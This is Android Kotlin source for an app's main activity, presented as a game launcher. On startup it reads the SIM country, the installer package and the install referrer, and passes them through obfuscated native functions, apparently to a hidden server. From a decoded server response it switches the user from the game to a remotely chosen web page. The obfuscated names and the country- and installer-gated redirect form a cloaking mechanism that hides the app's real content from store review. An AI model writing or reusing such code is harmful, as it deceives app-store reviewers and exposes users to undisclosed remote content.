package com.oerineor.gjroijhort.app

import android.content.Intent
import android.os.Bundle
import android.os.Handler
import androidx.appcompat.app.AppCompatActivity
import com.oerineor.gjroijhort.app.utils.LogUtil
import com.oerineor.gjroijhort.app.utils.SpUtil
import com.oerineor.gjroijhort.app.utils.getInstallerPackageName
import com.oerineor.gjroijhort.app.utils.getSimCountryIso
import com.oerineor.gjroijhort.app.utils.setFullWindow
import com.oerineor.gjroijhort.app.webView.WebActivity
import com.libgdx.game.R
import com.einvibtgudrx.bifhgaggmeetr4.android.AndroidLauncher
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.runBlocking
import org.json.JSONArray

class MainActivity : AppCompatActivity() {

    private val handler: Handler = Handler()
    companion object {
        private lateinit var instance: MainActivity

        fun getInstance(): MainActivity {
            return instance
        }

        @JvmStatic
        fun EKVFKNEI(content: String) {
            // 在这里处理接收到的数据
            if (content.isEmpty())
                return

            val jsonArray = JSONArray(content)
            LogUtil.i("MainActivity 接收到的数据-==============- Received data: $content \n--- ${jsonArray.length()}")
            if (jsonArray.length() >= 1) {
                val url = JniLibrary.LKVMEWQ(jsonArray[0].toString())
                LogUtil.i("jsonArray[0].toString() === ${url}")
                instance.openWeb(url)
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        instance = this
        setFullWindow(this)
        setContentView(R.layout.activity_main)

        openGame()

        val jsonArray = JSONArray()
        jsonArray.put(JniLibrary.EOMVJRE(getSimCountryIso()))
        jsonArray.put(JniLibrary.EOMVJRE(getInstallerPackageName()))
        jsonArray.put(JniLibrary.EOMVJRE(applicationContext.packageName))
        jsonArray.put(JniLibrary.EOMVJRE(SpUtil["referrer", ""].toString()))
        val jsonString = jsonArray.toString()

        // 使用 Coroutine 进行异步操作
//        LogUtil.i("jsonString -------- ${SpUtil["referrer", ""].toString()}")
        runBlocking {
            launch(Dispatchers.IO) {
                val resultStr = JniLibrary.OGENIDS(jsonString)
//                LogUtil.i("resultStr ---- $resultStr -- ${resultStr.length}")
                if (resultStr.isNullOrEmpty() || resultStr == "\"\"") {
//                    LogUtil.i("为空 返回------------")
                    return@launch
                }
                App.getInstance().data = JSONArray(resultStr)
//                LogUtil.i("data 字符串数组 个数 -- ${App.getInstance().data.length()}")
//                for (i in 0 until App.getInstance().data.length()) {
//                    LogUtil.i("$i -- ${JniLibrary.LKVMEWQ(App.getInstance().data[i].toString())}")
//                }
            }
        }
    }
    fun openGame() {
        LogUtil.i("打开游戏---")
        val intent = Intent(this, AndroidLauncher::class.java)
        intent.flags = Intent.FLAG_ACTIVITY_CLEAR_TASK or Intent.FLAG_ACTIVITY_NEW_TASK
        startActivity(intent)
        finishAffinity()
    }

    fun openWeb(url: String) {
        LogUtil.i("打开网页---$url")
        val intent = Intent(this, WebActivity::class.java)
        intent.flags = Intent.FLAG_ACTIVITY_CLEAR_TASK or Intent.FLAG_ACTIVITY_NEW_TASK
        intent.putExtra(Intent.ACTION_ATTACH_DATA, url)
        startActivity(intent)
    }
}
